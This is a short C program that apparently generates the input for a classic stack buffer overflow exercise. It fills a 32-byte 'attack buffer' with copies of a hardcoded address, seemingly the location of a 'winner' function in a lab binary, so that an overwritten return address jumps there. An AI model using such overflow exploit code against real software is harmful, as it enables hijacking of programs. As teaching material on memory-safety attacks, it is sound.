#include <stdio.h>

#define BUF_LEN     32
#define WINNER_ADDR 0x8048ec4

int main(int argc, char **argv)
{
  int i=0;
  char outs[BUF_LEN+1];		/* length of attack buffer +1 for '\0' */
  for (; i<BUF_LEN; i+=4)
    *(int*)(&outs[i])=WINNER_ADDR;
  *(int*)(&outs[i])=0;          /* so that the "string" will be null- */
  puts(outs);                   /*         terminated for puts() */

  return 0;
}
